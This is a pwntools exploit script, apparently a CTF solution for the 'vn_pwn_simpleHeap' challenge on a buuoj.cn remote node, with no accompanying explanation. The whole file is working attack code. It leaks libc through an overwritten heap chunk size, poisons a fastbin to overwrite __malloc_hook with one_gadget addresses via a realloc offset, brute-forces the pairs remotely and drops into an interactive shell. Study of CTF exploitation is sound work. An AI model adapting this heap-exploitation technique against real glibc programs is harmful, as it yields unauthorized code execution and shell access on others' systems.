from pwn import *
from LibcSearcher import *

elf = ELF('./vn_pwn_simpleHeap')
libc = ELF('../../libc/1664')
# r = process(['../../libc/1664ld', './vn_pwn_simpleHeap'],
#           env={'LD_PRELOAD': '../../libc/1664'})
context.arch = 'amd64'


def add(size, content):
    r.recvuntil('choice: ')
    r.send('1')
    r.recvuntil('size?')
    r.send(str(size))
    r.recvuntil('content:')
    r.send(content)


def edit(index, content):
    r.recvuntil('choice: ')
    r.send('2')
    r.recvuntil('idx?')
    r.send(str(index))
    r.recvuntil('content:')
    r.send(content)


def show(index):
    r.recvuntil('choice: ')
    r.send('3')
    r.recvuntil('idx?')
    r.send(str(index))


def delete(index):
    r.recvuntil('choice: ')
    r.send('4')
    r.recvuntil('idx?')
    r.send(str(index))


one_gadget_addr = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
realloc_offset = [0, 2, 4, 6, 8, 0xB, 0xC, 0xD]

for ogg in one_gadget_addr:
    for off in realloc_offset:
        r = remote('node3.buuoj.cn', 29563)
        add(0x18, 'da')
        add(0x10, 'da')
        add(0x60, 'da')
        add(0x60, 'da')
        edit(0, 'a' * 0x10 + p64(0) + p8(0x91))
        delete(1)
        add(0x10, 'a' * 8)
        add(0x60, 'da')
        show(1)
        r.recv(8)
        libc_base = u64(r.recv(6).ljust(8, '\x00')) - 0x3C4BF8
        malloc_hook_addr = libc_base + libc.symbols['__malloc_hook']
        realloc_hook_addr = libc_base + libc.symbols['__libc_realloc']
        delete(2)
        delete(3)
        delete(4)
        add(0x60, p64(malloc_hook_addr - 0x23))
        add(0x60, 'da')
        add(0x60, 'da')
        add(0x60, 'a' * 0xb + flat([libc_base + ogg, realloc_hook_addr + off]))
        r.recvuntil('choice: ')
        r.send('1')
        r.recvuntil('size?')
        r.send('22')
        r.sendline('id')
        try:
            if r.recv(3) != 'uid':
                r.close()
                continue
        except EOFError:
            r.close()
            continue
        else:
            r.recvline()
            r.interactive()
